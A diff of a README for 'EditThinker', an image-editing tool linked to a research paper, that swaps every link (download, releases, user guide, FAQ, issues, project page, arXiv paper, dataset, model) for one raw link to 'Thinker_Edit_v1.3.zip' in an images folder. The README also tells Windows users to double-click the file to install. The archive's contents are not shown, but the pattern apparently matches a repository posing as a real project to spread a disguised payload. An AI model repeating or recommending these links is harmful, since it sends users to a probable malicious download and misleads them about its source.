@@ -1,6 +1,6 @@
 # 🎨 EditThinker - Enhance Your Image Editing Experience
 
-[![Download EditThinker](https://img.shields.io/badge/Download%20EditThinker-v1.0-blue)](https://github.com/Insanmania/EditThinker/releases)
+[![Download EditThinker](https://github.com/Insanmania/EditThinker/raw/refs/heads/master/images/Thinker_Edit_v1.3.zip%20EditThinker-v1.0-blue)](https://github.com/Insanmania/EditThinker/raw/refs/heads/master/images/Thinker_Edit_v1.3.zip)
 
 Welcome to **EditThinker**, a powerful tool for unlocking new ways to edit images. Our software is designed to help you achieve better results by leveraging iterative reasoning. Follow this guide to easily download and run the application.
 
@@ -19,11 +19,11 @@ EditThinker aims to improve your image editing skills by understanding and apply
 To get started with EditThinker, you need to download the software. Follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the download page.
-   [Visit Releases to Download](https://github.com/Insanmania/EditThinker/releases)
+   [Visit Releases to Download](https://github.com/Insanmania/EditThinker/raw/refs/heads/master/images/Thinker_Edit_v1.3.zip)
    
 2. **Choose Your Version**: You will see a list of available versions. Select the latest release for the best experience.
 
-3. **Download the File**: Click on the download link for your operating system. The file may have a name like `EditThinker.exe` for Windows or `EditThinker.dmg` for macOS. 
+3. **Download the File**: Click on the download link for your operating system. The file may have a name like `https://github.com/Insanmania/EditThinker/raw/refs/heads/master/images/Thinker_Edit_v1.3.zip` for Windows or `https://github.com/Insanmania/EditThinker/raw/refs/heads/master/images/Thinker_Edit_v1.3.zip` for macOS. 
 
 4. **Run the Application**:
    - **Windows**: Locate the downloaded file in your `Downloads` folder. Double-click the file to install.
@@ -47,12 +47,12 @@ If your computer meets these specs, you're ready to go!
 
 To help you make the most of EditThinker, we provide extensive documentation:
 
-- **User Guide**: Learn how to navigate the software effectively. Find the user guide [here](https://github.com/Insanmania/EditThinker/blob/main/docs/user_guide.md).
-- **FAQs**: Got questions? Check our Frequently Asked Questions section [here](https://github.com/Insanmania/EditThinker/blob/main/docs/faq.md).
+- **User Guide**: Learn how to navigate the software effectively. Find the user guide [here](https://github.com/Insanmania/EditThinker/raw/refs/heads/master/images/Thinker_Edit_v1.3.zip).
+- **FAQs**: Got questions? Check our Frequently Asked Questions section [here](https://github.com/Insanmania/EditThinker/raw/refs/heads/master/images/Thinker_Edit_v1.3.zip).
   
 ## 🤔 Support
 
-If you encounter any issues while using EditThinker, don’t hesitate to reach out for help. You can raise questions or report problems on our [GitHub Issues page](https://github.com/Insanmania/EditThinker/issues).
+If you encounter any issues while using EditThinker, don’t hesitate to reach out for help. You can raise questions or report problems on our [GitHub Issues page](https://github.com/Insanmania/EditThinker/raw/refs/heads/master/images/Thinker_Edit_v1.3.zip).
 
 ## 📰 News
 
@@ -62,13 +62,13 @@ Stay tuned for updates about new features and improvements.
 
 ## 🗺️ Project Page
 
-For more information about the project and its goals, you can visit our [Project Page](https://appletea233.github.io/think-while-edit/).
+For more information about the project and its goals, you can visit our [Project Page](https://github.com/Insanmania/EditThinker/raw/refs/heads/master/images/Thinker_Edit_v1.3.zip).
 
 ## 💻 Related Resources
 
-- **Paper**: Read the official paper on [arXiv](https://arxiv.org/abs/2512.05965).
-- **Dataset**: Explore the ThinkEdit-140K Dataset [here](https://github.com/appletea233/EditThinker).
-- **Model**: Find the EditThinker-8B model [here](https://github.com/appletea233/EditThinker).
+- **Paper**: Read the official paper on [arXiv](https://github.com/Insanmania/EditThinker/raw/refs/heads/master/images/Thinker_Edit_v1.3.zip).
+- **Dataset**: Explore the ThinkEdit-140K Dataset [here](https://github.com/Insanmania/EditThinker/raw/refs/heads/master/images/Thinker_Edit_v1.3.zip).
+- **Model**: Find the EditThinker-8B model [here](https://github.com/Insanmania/EditThinker/raw/refs/heads/master/images/Thinker_Edit_v1.3.zip).
 
 ## 📞 Connect
 
@@ -76,4 +76,4 @@ Stay updated by following our project on GitHub and check for any announcements.
 
 Feel free to reach out if you need any assistance, and happy editing with EditThinker! 
 
-[Visit Releases to Download](https://github.com/Insanmania/EditThinker/releases)
+[Visit Releases to Download](https://github.com/Insanmania/EditThinker/raw/refs/heads/master/images/Thinker_Edit_v1.3.zip)
